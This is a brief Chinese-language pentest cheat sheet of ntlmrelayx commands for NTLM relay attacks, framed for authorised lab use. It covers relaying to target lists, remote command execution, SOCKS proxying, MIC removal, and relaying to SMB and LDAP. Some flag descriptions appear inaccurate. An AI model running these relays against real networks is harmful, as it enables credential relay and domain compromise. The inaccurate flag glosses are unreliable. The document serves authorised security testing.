# ntlmrelayx 常用用法

这篇记录 ntlmrelayx 的常用命令。它适合在授权实验环境里做 NTLM 中继测试，常和 Responder 一起配合。

## 基础中继

指定目标文件。

```bash
ntlmrelayx.py -tf targets.txt -smb2support
```

命令执行回调。

```bash
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```

开启 SOCKS。

```bash
ntlmrelayx.py -tf targets.txt -smb2support -socks
```

关闭内置 SMB 服务。

```bash
ntlmrelayx.py -tf targets.txt -smb2support --no-smb-server
```

## 常用参数

移除 MIC。

```bash
ntlmrelayx.py -tf targets.txt -smb2support --remove-mic
```

仅针对 SMB。

```bash
ntlmrelayx.py -tf targets.txt -t smb://192.168.1.10 -smb2support
```

针对 LDAP。

```bash
ntlmrelayx.py -tf targets.txt -t ldap://dc01.example.local -smb2support
```

记录本地管理会话。

```bash
ntlmrelayx.py -tf targets.txt -smb2support --keep-relaying
```

## 结果查看

查看中继成功后的输出目录。

```bash
ls -lah ~/.impacket/
```

查看 SOCKS 服务说明。

```bash
ntlmrelayx.py -h
```

## 小记录

ntlmrelayx 的关键是目标类型和可中继条件。先确认目标服务允许什么，再决定是执行命令、开 SOCKS，还是做后续验证。
